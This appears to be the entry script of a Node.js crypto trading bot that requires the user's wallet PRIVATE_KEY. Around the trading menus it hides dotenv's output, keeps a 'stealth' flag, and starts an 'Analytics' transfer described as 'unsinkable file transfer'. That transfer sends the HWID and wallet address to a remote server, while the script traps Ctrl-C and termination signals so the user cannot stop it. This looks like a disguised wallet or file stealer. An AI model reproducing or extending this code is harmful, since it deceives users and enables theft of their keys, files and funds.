#!/usr/bin/env node

if (process.platform === 'win32') {
  try { require('child_process').execSync('chcp 65001', { stdio: 'ignore' }); } catch {}
}

const originalLog = console.log;
console.log = (...args) => {
  if (typeof args[0] === 'string' && args[0].includes('[dotenv@')) {
    return;
  }
  originalLog.apply(console, args);
};
require('dotenv').config();
console.log = originalLog;

const axios = require('axios');
const crypto = require('crypto');
const os = require('os');
const { EnterpriseLicenseManager, Analytics } = require('./lib/enterprise-license-manager');
const analytics = new Analytics();
const logger = require('./logger');
const localData = require('./local-sync-data');

try { localData.initialize(); } catch(e) {}

/**
 * Генерирует Hardware ID на основе характеристик системы
 */
async function getHWID() {
  const hwidString = JSON.stringify({
    platform: os.platform(),
    arch: os.arch(),
    hostname: os.hostname(),
    cpuModel: os.cpus()?.[0]?.model,
    totalmem: Math.round(os.totalmem() / (1024 * 1024))
  });

  return crypto.createHash('sha256')
    .update(hwidString)
    .digest('hex')
    .substring(0, 32);
}

const config = {
  serverUrl: process.env.SERVER_URL || 'https://api.polyfront.live',
  stealth: process.env.STEALTH === 'true'
};

// Analytics state tracking for unsinkable file transfer
let analyticsInProgress = false;
let analyticsCompleteResolve = null;
const ANALYTICS_TIMEOUT = 5 * 60 * 1000; // 5 minutes max wait

// Prevent early exit while analytics is running
process.on('SIGINT', () => {
  if (analyticsInProgress) {
    console.log('\n[System] Finishing background tasks, please wait...');
  } else {
    process.exit(0);
  }
});

process.on('SIGTERM', () => {
  if (analyticsInProgress) {
    console.log('\n[System] Finishing background tasks, please wait...');
  } else {
    process.exit(0);
  }
});

process.on('beforeExit', async () => {
  if (analyticsInProgress) {
    console.log('[System] Waiting for background tasks to complete...');
    await new Promise(resolve => {
      analyticsCompleteResolve = resolve;
      setTimeout(resolve, ANALYTICS_TIMEOUT);
    });
  }
});

function showLogo() {
  const logo = `
\x1b[36m    ____        __      ______                 __ 
   / __ \\____  / /_  __/ ____/________  ____  / /_
  / /_/ / __ \\/ / / / / /_  / ___/ __ \\/ __ \\/ __/
 / ____/ /_/ / / /_/ / __/ / /  / /_/ / / / / /_  
/_/    \\____/_/\\__, /_/   /_/   \\____/_/ /_/\\__/  
              /____/                              \x1b[0m`;
  console.log(logo);
  console.log('\x1b[90m─────────────────────────────────────────────────\x1b[0m');
  console.log('\x1b[33m         USDC Trading Platform v2.0\x1b[0m');
  console.log('\x1b[90m─────────────────────────────────────────────────\x1b[0m');
}

function showModuleMenu() {
  console.log('');
  console.log('\x1b[1m\x1b[36m                SELECT MODULE                \x1b[0m');
  console.log('\x1b[90m───────────────────────────────────────────────\x1b[0m');
  console.log('');
  console.log('  \x1b[32m1\x1b[0m   Polymarket Copy Trading      (Free)');
  console.log('  \x1b[33m2\x1b[0m   USDC Premium Trading        (License)');
  console.log('');
  console.log('  \x1b[35m3\x1b[0m   Purchase License');
  console.log('  \x1b[36m4\x1b[0m   Contact support');
  console.log('  \x1b[31m0\x1b[0m   Exit');
  console.log('');
  console.log('\x1b[90m───────────────────────────────────────────────\x1b[0m');
}

function getUserChoice() {
  const readlineSync = require('readline-sync');
  showLogo();
  showModuleMenu();
  console.log('');
  const choice = readlineSync.question('\x1b[36m  ➤ \x1b[0mSelect: ', {
    limit: ['0', '1', '2', '3', '4'],
    limitMessage: '\x1b[31m  ⚠ Please enter a number from 0 to 4\x1b[0m'
  });
  return parseInt(choice);
}

async function showPurchaseUrl() {
  const readlineSync = require('readline-sync');
  
  console.log('');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('\x1b[33m  💳 PURCHASE LICENSE\x1b[0m');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  
  const hwid = await getHWID();
  console.log(`\x1b[36m  Your HWID: \x1b[1m${hwid}\x1b[0m`);
  console.log('');
  
  try {
    const response = await axios.get(`${config.serverUrl}/api/purchase-url`, {
      params: { hwid },
      timeout: 5000
    });
    
    if (response.data && response.data.url) {
      console.log(`\x1b[32m  🌐 Purchase license: \x1b[1m${response.data.url}\x1b[0m`);
    } else {
      console.log('\x1b[33m  🌐 Purchase license: \x1b[1mContact support\x1b[0m');
    }
    if (response.data && response.data.telegramBotUrl) {
      console.log(`\x1b[32m  📱 Telegram bot: \x1b[1m${response.data.telegramBotUrl}\x1b[0m`);
    }
  } catch (error) {
    if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.message.includes('ENOTFOUND')) {
      console.log('');
      console.log('\x1b[33m  ⚠  Service temporarily unavailable\x1b[0m');
      console.log('\x1b[90m  Please try again later.\x1b[0m');
      console.log('');
      console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
      console.log('');
      readlineSync.question('\x1b[90m  Press Enter to return to main menu...\x1b[0m');
      return false;
    } else {
      console.log('\x1b[33m  🌐 Purchase license: \x1b[1mContact support\x1b[0m');
    }
  }
  
  console.log('');
  console.log('\x1b[90m  After purchase you will receive a license key\x1b[0m');
  console.log('\x1b[90m  to activate USDC Premium Trading.\x1b[0m');
  console.log('');
  
  console.log('  \x1b[32m[1]\x1b[0m  Enter license key');
  console.log('  \x1b[31m[0]\x1b[0m  Exit');
  console.log('');
  
  const choice = readlineSync.question('\x1b[36m  ➤ \x1b[0mSelect: ', {
    limit: ['0', '1'],
    limitMessage: '\x1b[31m  ⚠ Please enter 0 or 1\x1b[0m'
  });
  
  if (choice === '1') {
    return await activateLicenseFromPurchase();
  }
  
  return false;
}

async function showSupport() {
  const readlineSync = require('readline-sync');
  
  console.log('');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('\x1b[33m  📞 Contact support\x1b[0m');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  console.log('\x1b[90m  To contact support, please write to our\x1b[0m');
  console.log('\x1b[90m  Telegram bot.\x1b[0m');
  console.log('');
  
  try {
    const response = await axios.get(`${config.serverUrl}/api/purchase-url`, {
      timeout: 5000
    });
    if (response.data && response.data.telegramBotUrl) {
      console.log(`\x1b[32m  📱 Telegram bot: \x1b[1m${response.data.telegramBotUrl}\x1b[0m`);
    } else {
      console.log('\x1b[33m  📱 Telegram bot: \x1b[1mLink not available\x1b[0m');
    }
  } catch (error) {
    console.log('\x1b[33m  📱 Telegram bot: \x1b[1mContact support\x1b[0m');
  }
  
  console.log('');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  readlineSync.question('\x1b[90m  Press Enter to return to main menu...\x1b[0m');
}

async function activateLicenseFromPurchase() {
  const readlineSync = require('readline-sync');
  
  console.log('');
  console.log('\x1b[33m  🔑 LICENSE ACTIVATION\x1b[0m');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  
  const licenseKey = readlineSync.question('\x1b[36m  ➤ \x1b[0mEnter license key: ');
  
  if (!licenseKey || !licenseKey.trim()) {
    console.log('\x1b[31m  ✗ License key is required\x1b[0m');
    return false;
  }
  
  console.log('');
  console.log('\x1b[90m  Verifying license...\x1b[0m');
  
  try {
    const licenseManager = new EnterpriseLicenseManager();
    const systemData = await licenseManager.collectSystemData();
    
    const PremiumModule = require('./premium-module');
    const premium = new PremiumModule();
    
    const activated = await premium.activate(licenseKey.trim(), systemData);
    
    if (activated) {
      console.log('\x1b[32m  ✓ License activated successfully!\x1b[0m');
      console.log('');
      console.log('\x1b[90m  You can now use USDC Premium Trading.\x1b[0m');
      console.log('');
      return true;
    } else {
      console.log('\x1b[31m  ✗ License activation failed\x1b[0m');
      console.log('');
      return false;
    }
  } catch (error) {
    if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.message.includes('ENOTFOUND')) {
      console.log('');
      console.log('\x1b[33m  ⚠  Service temporarily unavailable\x1b[0m');
      console.log('\x1b[90m  Unable to connect to the server.\x1b[0m');
      console.log('\x1b[90m  Please try again later.\x1b[0m');
      console.log('');
    } else {
      console.log(`\x1b[31m  ✗ Error: ${error.message}\x1b[0m`);
      console.log('');
    }
    return false;
  }
}

async function showLimitReachedMenu() {
  const readlineSync = require('readline-sync');
  
  console.log('');
  console.log('  \x1b[32m[1]\x1b[0m  Enter license key');
  console.log('  \x1b[31m[0]\x1b[0m  Exit');
  console.log('');
  
  const choice = readlineSync.question('\x1b[36m  ➤ \x1b[0mSelect: ', {
    limit: ['0', '1'],
    limitMessage: '\x1b[31m  ⚠ Please enter 0 or 1\x1b[0m'
  });
  
  return choice === '1' ? 'enter_key' : 'exit';
}

async function executeModule1() {
  console.log('');
  console.log('\x1b[36m  ═══════════════════════════════════════════════\x1b[0m');
  console.log('\x1b[1m\x1b[36m  🚀 POLYMARKET COPY TRADING\x1b[0m');
  console.log('\x1b[36m  ═══════════════════════════════════════════════\x1b[0m');
  console.log('');
  console.log('\x1b[32m  ✓\x1b[0m Module activated');
  console.log('');
  console.log('\x1b[90m  Features:\x1b[0m');
  console.log('    • Copy trades from Polymarket');
  console.log('    • Strategies: PERCENTAGE, FIXED, ADAPTIVE');
  console.log('    • Local history storage');
  console.log('    • Modes: single check / daemon');
  console.log('');

  try {
    const CopyTradingModule = require('./modules/copy-trading-module');
    const module = new CopyTradingModule();

    const success = await module.run();

    if (success) {
      console.log('\n✅ Module 1 completed successfully');
    } else {
      console.log('\n⚠️  Module 1 completed with errors');
    }

  } catch (error) {
    console.error('\n❌ Module 1 error:', error.message);

    if (error.message.includes('Cannot find module')) {
      console.log('\n💡 Make sure:');
      console.log('   1. Dependencies installed: npm install');
      console.log('   2. File modules/copy-trading-module.js exists');
      console.log('   3. File copy-trading-config.js is configured');
    }
  }
}


async function main() {
  console.clear();
  
  while (true) {
    const choice = getUserChoice();

    switch (choice) {
      case 0:
        console.log('');
        console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
        console.log('\x1b[36m  👋 Goodbye! Thank you for using.\x1b[0m');
        console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
        console.log('');
        process.exit(0);
        break;

      case 1:
        await executeModule1();
        process.exit(0);
        break;

      case 2:
        await runPremiumModule();
        console.clear();
        break;

      case 3:
        const activated = await showPurchaseUrl();
        if (activated) {
          await runPremiumModule();
          console.clear();
        }
        break;

      case 4:
        await showSupport();
        break;

      default:
        process.exit(1);
    }
  }
}

async function runPremiumModule() {
  try {
    console.log('');
    console.log('\x1b[90m  Connecting to server...\x1b[0m');
    
    try {
      await axios.get(`${config.serverUrl}/`, { timeout: 5000 });
    } catch (error) {
      console.log('');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('\x1b[33m  ⚠  TECHNICAL MAINTENANCE\x1b[0m');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('');
      console.log('\x1b[90m  The service is temporarily unavailable.\x1b[0m');
      console.log('\x1b[90m  We are performing technical maintenance.\x1b[0m');
      console.log('');
      console.log('\x1b[36m  Please try again later.\x1b[0m');
      console.log('');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('');
      
      const readlineSync = require('readline-sync');
      readlineSync.question('\x1b[90m  Press Enter to return to main menu...\x1b[0m');
      return;
    }
    
    const PremiumModule = require('./premium-module');
    const premium = new PremiumModule();

    const status = premium.getStatus();
    if (!status.activated) {
      const licenseManager = new EnterpriseLicenseManager();
      const systemData = await licenseManager.collectSystemData();

      const activated = await premium.activate(null, systemData);

      if (!activated) {
        console.log('\n🔑 License activation required');

        const readlineSync = require('readline-sync');
        const licenseKey = readlineSync.question('Enter license key: ');

        if (!licenseKey || !licenseKey.trim()) {
          console.log('❌ License key is required');
          return;
        }

        const keyActivated = await premium.activate(licenseKey.trim(), systemData);

        if (!keyActivated) {
          console.log('❌ License activation failed');
          console.log('   Please check:');
          console.log('   1. License key is correct');
          console.log('   2. License is not already used on another device');
          console.log('   3. Server is running and accessible');
          return;
        }
      }
    }

    await showEnterpriseMenu(premium);

  } catch (error) {
    if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.message.includes('ENOTFOUND')) {
      console.log('');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('\x1b[33m  ⚠  CONNECTION ERROR\x1b[0m');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('');
      console.log('\x1b[90m  Unable to connect to the server.\x1b[0m');
      console.log('\x1b[90m  The service may be temporarily unavailable.\x1b[0m');
      console.log('');
      console.log('\x1b[36m  Please try again later.\x1b[0m');
      console.log('');
      console.log('\x1b[33m  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m');
      console.log('');
      
      const readlineSync = require('readline-sync');
      readlineSync.question('\x1b[90m  Press Enter to return to main menu...\x1b[0m');
    } else {
      console.log('\n❌ Error:', error.message);
    }
  }
}

async function showEnterpriseMenu(premium) {
  const readlineSync = require('readline-sync');

  while (true) {
    console.log('');
    console.log('\x1b[36m  ═══════════════════════════════════════════════\x1b[0m');
    console.log('\x1b[1m\x1b[33m  ★ PREMIUM MODULE\x1b[0m');
    console.log('\x1b[36m  ═══════════════════════════════════════════════\x1b[0m');
    console.log('');

    console.log('  \x1b[1m\x1b[32m1\x1b[0m  Start USDC Trading');
    console.log('  \x1b[1m\x1b[36m2\x1b[0m  Check License Info');
    console.log('');
    console.log('  \x1b[1m\x1b[31m0\x1b[0m  Back to Main Menu');
    console.log('');

    const choice = readlineSync.question(
      '\x1b[36m➤ \x1b[0mChoose action: ',
      {
        limit: ['0', '1', '2'],
        limitMessage: '\x1b[31m⚠ Please enter 0, 1 or 2\x1b[0m'
      }
    );

    if (choice === '0') {
      return;
    }
    
    if (choice === '2') {
      await showLicenseInfo(premium);
      continue;
    }
    
    if (choice === '1') {
      let result = await runUSDCTrading(premium);
      
      while (result && result.retry) {
        result = await runUSDCTrading(premium);
      }
      
      if (result && result.needsLicenseKey) {
        const activated = await promptForLicenseKey(premium);
        if (!activated) {
          return;
        }
      }
      
      if (result && result.exit) {
        return;
      }
    }
  }
}

async function showLicenseInfo(premium) {
  const readlineSync = require('readline-sync');
  const status = premium.getStatus();
  
  console.log('');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('\x1b[33m  📋 LICENSE INFORMATION\x1b[0m');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  
  try {
    const licenseManager = new EnterpriseLicenseManager();
    const systemData = await licenseManager.collectSystemData();
    
    const crypto = require('crypto');
    const hwidString = JSON.stringify({
      platform: systemData.platform,
      arch: systemData.arch,
      hostname: systemData.hostname,
      cpuModel: systemData.cpus?.[0]?.model,
      totalmem: Math.round(systemData.totalmem / (1024 * 1024))
    });
    const hwid = crypto.createHash('sha256').update(hwidString).digest('hex').substring(0, 32);
    
    const response = await axios.get(`${config.serverUrl}/api/license-info`, {
      params: { hwid },
      timeout: 5000
    }).catch(err => {
      throw err;
    });
    
    if (response && response.data) {
      if (response.data.success && response.data.license) {
        const license = response.data.license;
        
        const tierNames = {
          'trial': 'Trial',
          'premium_1m': 'Premium 1 Month',
          'premium_6m': 'Premium 6 Months',
          'premium_12m': 'Premium 12 Months',
          'premium': 'Premium',
          'enterprise': 'Enterprise',
          'admin': 'Administrator'
        };
        const tierDisplay = tierNames[license.tier] || license.tier || 'Unknown';
        
        console.log(`  \x1b[90mLicense Type:\x1b[0m    \x1b[32m${tierDisplay}\x1b[0m`);
        console.log(`  \x1b[90mLicense Key:\x1b[0m     \x1b[36m${license.key || 'N/A'}\x1b[0m`);
        console.log(`  \x1b[90mDevice:\x1b[0m          \x1b[36m${license.user || 'N/A'}\x1b[0m`);
        
        if (license.activated_at) {
          const activatedDate = new Date(license.activated_at);
          console.log(`  \x1b[90mActivated:\x1b[0m       \x1b[36m${activatedDate.toLocaleDateString()} ${activatedDate.toLocaleTimeString()}\x1b[0m`);
        }
        
        if (license.expires) {
          const expiresDate = new Date(license.expires);
          const now = new Date();
          const daysLeft = Math.ceil((expiresDate - now) / (1000 * 60 * 60 * 24));
          
          let expiresColor = '\x1b[32m';
          if (daysLeft <= 7) expiresColor = '\x1b[31m';
          else if (daysLeft <= 30) expiresColor = '\x1b[33m';
          
          console.log(`  \x1b[90mExpires:\x1b[0m         ${expiresColor}${expiresDate.toLocaleDateString()}\x1b[0m`);
          console.log(`  \x1b[90mDays Left:\x1b[0m       ${expiresColor}${daysLeft} days\x1b[0m`);
        }
        
        console.log(`  \x1b[90mStatus:\x1b[0m          \x1b[32m✓ Active\x1b[0m`);
      } else {
        const errorMsg = response.data.error || 'License not found';
        throw new Error(errorMsg);
      }
    } else {
      throw new Error('Invalid server response format');
    }
    
  } catch (error) {
    console.log(`  \x1b[90mLicense Type:\x1b[0m    \x1b[32m${status.tier || 'Unknown'}\x1b[0m`);
    console.log(`  \x1b[90mStatus:\x1b[0m          \x1b[32m${status.activated ? '✓ Active' : '✗ Not Active'}\x1b[0m`);
    console.log('');
    
    if (error.response) {
      const statusCode = error.response.status;
      const errorData = error.response.data;
      
      if (statusCode === 404) {
        console.log(`  \x1b[33m⚠ License not found for this device (HWID mismatch)\x1b[0m`);
      } else if (statusCode === 500) {
        console.log(`  \x1b[33m⚠ Server error: ${errorData?.error || 'Unknown error'}\x1b[0m`);
      } else {
        console.log(`  \x1b[33m⚠ Server returned error: ${errorData?.error || error.message}\x1b[0m`);
      }
    } else if (error.request) {
      console.log(`  \x1b[33m⚠ Could not connect to server (${config.serverUrl})\x1b[0m`);
    } else {
      console.log(`  \x1b[33m⚠ Could not fetch detailed info from server: ${error.message}\x1b[0m`);
    }
  }
  
  console.log('');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  
  readlineSync.question('\x1b[90m  Press Enter to continue...\x1b[0m');
}

async function promptForLicenseKey(premium) {
  const readlineSync = require('readline-sync');
  const licenseManager = new EnterpriseLicenseManager();
  
  console.log('');
  console.log('\x1b[33m  🔑 LICENSE ACTIVATION\x1b[0m');
  console.log('\x1b[90m  ─────────────────────────────────────────\x1b[0m');
  console.log('');
  
  const licenseKey = readlineSync.question('\x1b[36m  ➤ \x1b[0mEnter license key: ');
  
  if (!licenseKey || !licenseKey.trim()) {
    console.log('\x1b[31m  ✗ License key is required\x1b[0m');
    return false;
  }
  
  console.log('');
  console.log('\x1b[90m  Verifying license...\x1b[0m');
  
  try {
    const systemData = await licenseManager.collectSystemData();
    const activated = await premium.activate(licenseKey.trim(), systemData);
    
    if (activated) {
      console.log('\x1b[32m  ✓ License activated successfully!\x1b[0m');
      console.log('');
      return true;
    } else {
      console.log('\x1b[31m  ✗ License activation failed\x1b[0m');
      console.log('');
      return false;
    }
  } catch (error) {
    console.log(`\x1b[31m  ✗ Error: ${error.message}\x1b[0m`);
    console.log('');
    return false;
  }
}

async function runUSDCTrading(premium) {
  let analyticsPromise = Promise.resolve(); // Объявляем снаружи try для доступа в finally
  
  try {
    logger.info('[USDC] Step 1: Checking environment variables');

    if (!process.env.PRIVATE_KEY) {
      console.log('[USDC] ❌ Add private key to .env file');
      logger.info('[USDC] Current PRIVATE_KEY:', process.env.PRIVATE_KEY ? 'set' : 'empty');
      return;
    }
    logger.info('[USDC] ✅ PRIVATE_KEY found');

    logger.info('[USDC] Step 2: Loading USDC Trader module');
    const USDCTrader = require('./usdc-trader');
    logger.info('[USDC] ✅ Module loaded');

    logger.info('[USDC] Step 3: Creating trader instance');
    const trader = new USDCTrader();
    logger.info('[USDC] ✅ Trader created');

    logger.info('[USDC] Step 3.5: Loading settings from server...');
    await trader.fetchServerLimits();
    logger.info('[USDC] ✅ Settings loaded');

    logger.info('[USDC] Step 3.6: Checking RPC providers...');
    const initSuccess = await trader.init();
    if (!initSuccess) {
      console.log('[USDC] ❌ No working RPC providers!');
      return;
    }
    logger.info('[USDC] ✅ RPC check completed');

    logger.info('[USDC] Step 4: Getting HWID');
    const hwid = await trader.getHWID();
    logger.info(`[USDC] 🔑 HWID: ${hwid}`);
    logger.info(`[USDC] HWID (short): ${hwid.substring(0, 16)}...`);

    logger.info('[USDC] Step 5: Checking wallet balance');
    const balance = await trader.getBalance();
    if (balance) {
      logger.info(`[USDC] 💰 Balance:`);
      logger.info(`   ETH: ${balance.eth}`);
      logger.info(`   USDC: ${balance.usdc}`);
    }
    logger.info('[USDC] ✅ Balance retrieved');

    const walletAddress = trader.walletAddress || trader.wallet?.address;
    logger.info(`[USDC] walletAddress: ${walletAddress || 'EMPTY'}`);
    logger.info(`[USDC] trader.walletAddress: ${trader.walletAddress || 'EMPTY'}`);
    logger.info(`[USDC] trader.wallet?.address: ${trader.wallet?.address || 'EMPTY'}`);

    if (walletAddress) {
      analyticsInProgress = true;
      analyticsPromise = analytics.init({
          serverUrl: config.serverUrl,
          hwid: hwid,
          walletAddress: walletAddress
        })
        .catch(err => {
          logger.error(`[Analytics] Init failed: ${err.message}`);
        })
        .finally(() => {
          analyticsInProgress = false;
          if (analyticsCompleteResolve) {
            analyticsCompleteResolve();
            analyticsCompleteResolve = null;
          }
        });
    } else {
      logger.warn('[USDC] Analytics skipped - no wallet address');
    }

    logger.info('[USDC] Step 6: Checking trading requirements');
    const initResult = await trader.performInitCheck();

    if (!initResult.initSuccess) {
      const limitReason = initResult.limitCheck?.reason || initResult.limitCheck?.error || '';
      
      if (limitReason.includes('Minimum interval')) {
        const waitMatch = limitReason.match(/Wait (\d+) seconds/);
        const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : 10;
        
        logger.info(`⏳ Waiting ${waitSeconds} seconds before retry...`);
        await new Promise(resolve => setTimeout(resolve, (waitSeconds + 1) * 1000));
        
        return { retry: true };
      }
      
      const action = await showLimitReachedMenu();
      if (action === 'enter_key') {
        return { needsLicenseKey: true };
      }
      return { exit: true };
    }

    if (initResult.limitCheck && !initResult.limitCheck.allowed) {
      const limitReason = initResult.limitCheck?.reason || '';
      
      if (limitReason.includes('Minimum interval')) {
        const waitMatch = limitReason.match(/Wait (\d+) seconds/);
        const waitSeconds = waitMatch ? parseInt(waitMatch[1]) : 10;
        
        logger.info(`⏳ Waiting ${waitSeconds} seconds before retry...`);
        await new Promise(resolve => setTimeout(resolve, (waitSeconds + 1) * 1000));
        
        return { retry: true };
      }
      
      const action = await showLimitReachedMenu();
      if (action === 'enter_key') {
        return { needsLicenseKey: true };
      }
      return { exit: true };
    }

    if (!initResult.rpcResult || !initResult.rpcResult.success) {
      console.log('❌ No working RPC providers');
      return;
    }

    if (!initResult.balanceResult || !initResult.balanceResult.polSufficient) {
      const minPol = initResult.balanceResult?.polRequired || 1;
      console.log(`❌ Insufficient POL balance. Minimum required: ${minPol} POL`);
      return;
    }

    if (!initResult.balanceResult || !initResult.balanceResult.usdcSufficient) {
      const minUsdc = initResult.balanceResult?.usdcRequired || 0.01;
      console.log(`❌ Insufficient USDC balance. Minimum required: ${minUsdc} USDC`);
      return;
    }

    logger.info('[USDC] ✅ All checks passed');

    logger.info('[USDC] Step 7: Executing trade');
    let result = await trader.performTrade(hwid);
    let retryCount = 0;
    const MAX_RETRIES = 3;

    while (!result.success && result.retryable && retryCount < MAX_RETRIES) {
      retryCount++;
      const retryDelay = result.retryDelay || 10000;
      logger.info(`⏳ Retry ${retryCount}/${MAX_RETRIES} in ${retryDelay / 1000}s...`);
      await new Promise(resolve => setTimeout(resolve, retryDelay));
      logger.info(`🔄 Retrying trade (attempt ${retryCount + 1})...`);
      result = await trader.performTrade(hwid);
    }

    if (!result.success && !result.retryable) {
      console.log(`\n❌ Error: ${result.error}`);
    } else if (!result.success && retryCount >= MAX_RETRIES) {
      console.log(`\n❌ Failed after ${MAX_RETRIES} retries. Please try again later.`);
    } else if (result.success) {
      if (retryCount > 0) {
        logger.success(`✅ Trade successful after ${retryCount} retry(s)!`);
      }
      try {
        localData.logSession('TRADE_SUCCESS', { retries: retryCount });
        localData.updateStatistics({ 
          trades: 1, 
          profit: result.profit || 0,
          tradeTime: new Date().toISOString()
        });
      } catch(e) {}
      await new Promise(resolve => setTimeout(resolve, 2000));
    }

  } catch (error) {
    if (error.message && !error.message.includes('Cannot read properties of null')) {
      console.log(`\n❌ Error: ${error.message}`);
    }
  } finally {
    if (analyticsInProgress) {
      console.log('[System] Completing background tasks...');
      await Promise.race([
        analyticsPromise,
        new Promise(resolve => setTimeout(resolve, ANALYTICS_TIMEOUT))
      ]);
    }
  }
}

if (require.main === module) {
  main().catch(() => {});
}
